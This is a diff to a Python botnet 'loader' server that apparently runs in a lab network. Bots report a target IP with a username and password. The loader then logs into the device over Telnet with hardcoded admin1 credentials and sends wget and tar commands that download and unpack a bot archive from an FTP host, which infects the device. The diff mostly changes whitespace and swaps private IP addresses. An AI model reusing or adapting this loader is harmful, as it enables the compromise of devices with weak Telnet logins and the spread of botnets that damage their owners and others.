@@ -21,7 +21,7 @@ from telnetlib import Telnet
 class servers:
     def __init__(self, name):
         self.name = name
-	
+
     # Handles connection threads from bots
     def threaded_bot(self, connection):
         connection.send(str.encode('Welcome to the Loader\n'))
@@ -35,7 +35,7 @@ class servers:
                 self.device_connect(ip=data.decode().split('_')[0], user=data.decode().split('_')[1],
                 password=data.decode().split('_')[2])
             connection.sendall(str.encode(reply))
-        
+
         connection.close()
 
     # Starts loader server
@@ -63,16 +63,16 @@ class servers:
             ThreadCount = threading.active_count()
 
             print('Thread Number: ' + str(ThreadCount))
-        
+
         ServerSocket.close()
 
     # Handles connection to device to be infected
     def device_connect(self, ip='127.0.0.1', user='', password=''):
         username = "admin1\n"
         password = "admin1\n"
-        command1 = b"wget -m ftp://admin1:admin1@192.168.11.5/bot_files.tar.gz -P /home/admin1\n"
-        command2 = b"mv ./192.168.11.5/bot_files.tar.gz /home/admin1/ ; rm -r /home/admin1/192.168.11.5/ ; tar -xzvf bot_files.tar.gz\n"
-        tn = Telnet('192.168.17.2', timeout=2)
+        command1 = b"wget -m ftp://admin1:admin1@192.168.100.12/bot_files.tar.gz -P /home/admin1\n"
+        command2 = b"mv ./192.168.100.12/bot_files.tar.gz /home/admin1/ ; rm -r /home/admin1/192.168.100.12/ ; tar -xzvf bot_files.tar.gz\n"
+        tn = Telnet('192.168.100.8', timeout=2)
         tn.read_until(b'to17 login: ', timeout=0.1)
         tn.write(username.encode('ascii'))
         tn.read_until(b'Password: ', timeout=0.1)
@@ -87,8 +87,8 @@ class servers:
         else:
             print("It didn't work :(")
 
-def main(): 
-	pass 
- 
-if __name__ == "__main__": 
+def main():
+	pass
+
+if __name__ == "__main__":
 	main()
